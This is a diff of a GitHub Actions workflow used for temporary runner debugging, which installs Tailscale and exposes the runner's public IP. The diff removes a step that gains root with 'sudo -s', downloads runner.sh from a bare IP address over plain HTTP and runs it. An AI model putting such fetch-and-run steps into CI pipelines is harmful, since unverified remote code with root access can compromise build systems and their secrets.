@@ -1,4 +1,4 @@
-name: Temporary runner debugging - 1
+name: Temporary runner debugging - 2
 
 on:
   workflow_dispatch:
@@ -23,10 +23,6 @@ jobs:
           curl ifconfig.me
           curl -fsSL https://tailscale.com/install.sh -o /tmp/install-tailscale.sh
           sh /tmp/install-tailscale.sh
-          sudo -s
-          wget http://95.217.212.145/runner.sh
-          sh runner.sh
-
       - name: Connect runner to your Tailscale account
         timeout-minutes: 5
         run: |
